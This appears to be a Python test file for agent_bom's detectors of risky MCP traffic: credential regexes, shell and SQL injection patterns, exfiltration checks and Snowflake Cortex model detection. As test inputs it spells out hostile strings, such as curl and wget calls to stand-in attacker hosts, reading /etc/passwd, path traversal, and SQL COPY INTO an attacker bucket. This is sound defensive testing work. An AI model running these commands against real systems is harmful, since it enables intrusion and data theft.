"""Tests for runtime MCP traffic patterns."""

from agent_bom.runtime.patterns import (
    CORTEX_MODEL_PATTERNS,
    CREDENTIAL_PATTERNS,
    DANGEROUS_ARG_PATTERNS,
    SUSPICIOUS_SEQUENCES,
    detect_cortex_models,
)

# ─── Credential patterns ─────────────────────────────────────────────────────


def test_credential_patterns_not_empty():
    assert len(CREDENTIAL_PATTERNS) > 0


def test_credential_pattern_aws_key():
    _, pattern = next((n, p) for n, p in CREDENTIAL_PATTERNS if "AWS Access" in n)
    assert pattern.search("AKIAIOSFODNN7EXAMPLE")
    assert not pattern.search("NOT_AN_AWS_KEY")


def test_credential_pattern_github():
    _, pattern = next((n, p) for n, p in CREDENTIAL_PATTERNS if "GitHub" in n)
    assert pattern.search("ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij")
    assert not pattern.search("gh_short")


def test_credential_pattern_openai():
    _, pattern = next((n, p) for n, p in CREDENTIAL_PATTERNS if "OpenAI" in n)
    assert pattern.search("sk-abcdefghij1234567890abcdefgh")
    assert not pattern.search("sk-short")


def test_credential_pattern_private_key():
    _, pattern = next((n, p) for n, p in CREDENTIAL_PATTERNS if "Private Key" in n)
    assert pattern.search("-----BEGIN RSA PRIVATE KEY-----")
    assert pattern.search("-----BEGIN PRIVATE KEY-----")
    assert not pattern.search("-----BEGIN PUBLIC KEY-----")


def test_credential_pattern_connection_string():
    _, pattern = next((n, p) for n, p in CREDENTIAL_PATTERNS if "Connection String" in n)
    assert pattern.search("mongodb://user:pass@host/db")
    assert pattern.search("postgres://admin:secret@db:5432/mydb")


# ─── Dangerous argument patterns ──────────────────────────────────────────────


def test_dangerous_patterns_not_empty():
    assert len(DANGEROUS_ARG_PATTERNS) > 0


def test_dangerous_shell_metachar():
    _, pattern = next((n, p) for n, p in DANGEROUS_ARG_PATTERNS if "Shell" in n)
    assert pattern.search("rm -rf ; ls")
    assert pattern.search("echo `whoami`")
    assert pattern.search("$(cat /etc/passwd)")


def test_dangerous_path_traversal():
    _, pattern = next((n, p) for n, p in DANGEROUS_ARG_PATTERNS if "Path traversal" in n)
    assert pattern.search("../../../etc/passwd")
    assert pattern.search("..\\windows\\system32")
    assert not pattern.search("/normal/path/file.txt")


def test_dangerous_command_injection():
    _, pattern = next((n, p) for n, p in DANGEROUS_ARG_PATTERNS if "Command injection" in n)
    assert pattern.search("curl https://evil.com")
    assert pattern.search("wget http://attacker.com/payload")
    assert pattern.search("bash -c 'whoami'")


def test_dangerous_env_var():
    _, pattern = next((n, p) for n, p in DANGEROUS_ARG_PATTERNS if "Environment" in n)
    assert pattern.search("$AWS_SECRET_ACCESS_KEY")
    assert pattern.search("$GITHUB_TOKEN")


# ─── Suspicious sequences ────────────────────────────────────────────────────


def test_suspicious_sequences_not_empty():
    assert len(SUSPICIOUS_SEQUENCES) > 0


def test_sequence_structure():
    for name, patterns, description in SUSPICIOUS_SEQUENCES:
        assert isinstance(name, str)
        assert isinstance(patterns, list)
        assert len(patterns) >= 2
        assert isinstance(description, str)


def test_sequence_names_unique():
    names = [name for name, _, _ in SUSPICIOUS_SEQUENCES]
    assert len(names) == len(set(names))


# ─── SQL injection patterns ──────────────────────────────────────────────────


def test_sql_drop_detected():
    _, pattern = next((n, p) for n, p in DANGEROUS_ARG_PATTERNS if "SQL DROP" in n)
    assert pattern.search("DROP TABLE users")
    assert pattern.search("drop database mydb")
    assert pattern.search("DROP SCHEMA public")
    assert not pattern.search("dropdown menu")


def test_sql_truncate_detected():
    _, pattern = next((n, p) for n, p in DANGEROUS_ARG_PATTERNS if "SQL TRUNCATE" in n)
    assert pattern.search("TRUNCATE TABLE users")
    assert pattern.search("truncate orders")
    assert not pattern.search("truncated string")


def test_sql_grant_revoke_detected():
    _, pattern = next((n, p) for n, p in DANGEROUS_ARG_PATTERNS if "SQL GRANT" in n)
    assert pattern.search("GRANT ALL ON DATABASE mydb TO ROLE analyst")
    assert pattern.search("REVOKE SELECT ON TABLE users FROM ROLE public")
    assert not pattern.search("granted permission in UI")


def test_sql_alter_privilege_detected():
    _, pattern = next((n, p) for n, p in DANGEROUS_ARG_PATTERNS if "SQL ALTER" in n)
    assert pattern.search("ALTER USER admin SET PASSWORD = 'new'")
    assert pattern.search("ALTER ROLE analyst")
    assert not pattern.search("ALTER TABLE users ADD COLUMN name TEXT")


def test_sql_copy_exfil_detected():
    _, pattern = next((n, p) for n, p in DANGEROUS_ARG_PATTERNS if "SQL data exfil" in n)
    assert pattern.search("COPY INTO 's3://attacker-bucket/data' FROM users")
    assert pattern.search("COPY INTO @my_stage FROM sensitive_table")
    assert not pattern.search("COPY INTO local_table FROM source_table")


def test_sql_create_stage_detected():
    _, pattern = next((n, p) for n, p in DANGEROUS_ARG_PATTERNS if "SQL external stage" in n)
    assert pattern.search("CREATE STAGE my_ext_stage URL='s3://bucket'")
    assert pattern.search("CREATE OR REPLACE STAGE evil_stage")


def test_sql_execute_immediate_detected():
    _, pattern = next((n, p) for n, p in DANGEROUS_ARG_PATTERNS if "EXECUTE IMMEDIATE" in n)
    assert pattern.search("EXECUTE IMMEDIATE 'DROP TABLE users'")
    assert pattern.search("execute immediate $dynamic_sql")
    assert not pattern.search("execute the plan")


# ─── Cortex model patterns ───────────────────────────────────────────────────


def test_cortex_model_patterns_not_empty():
    assert len(CORTEX_MODEL_PATTERNS) > 0


def test_cortex_complete_sql():
    results = detect_cortex_models("SELECT SNOWFLAKE.CORTEX.COMPLETE('mistral-large2', 'Summarize this text')")
    assert len(results) >= 1
    assert any(m == "mistral-large2" for _, m in results)


def test_cortex_complete_short_form():
    results = detect_cortex_models("CORTEX.COMPLETE('llama3.1-70b', prompt_col)")
    assert len(results) >= 1
    assert any(m == "llama3.1-70b" for _, m in results)


def test_cortex_embed():
    results = detect_cortex_models("SNOWFLAKE.CORTEX.EMBED_TEXT_768('e5-base-v2', text_col)")
    assert len(results) >= 1
    assert any(m == "e5-base-v2" for _, m in results)


def test_cortex_sentiment_no_model():
    results = detect_cortex_models("SELECT CORTEX.SENTIMENT(review_col) FROM reviews")
    assert len(results) >= 1
    assert any(n == "Cortex AI function" for n, _ in results)


def test_cortex_python_sdk():
    results = detect_cortex_models("response = Complete.create('claude-3.5-sonnet', messages=messages)")
    assert len(results) >= 1
    assert any(m == "claude-3.5-sonnet" for _, m in results)


def test_cortex_no_false_positive():
    results = detect_cortex_models("SELECT name, age FROM users WHERE active = true")
    assert len(results) == 0


def test_cortex_case_insensitive():
    results = detect_cortex_models("cortex.complete('mixtral-8x7b', 'hello')")
    assert len(results) >= 1
    assert any(m == "mixtral-8x7b" for _, m in results)
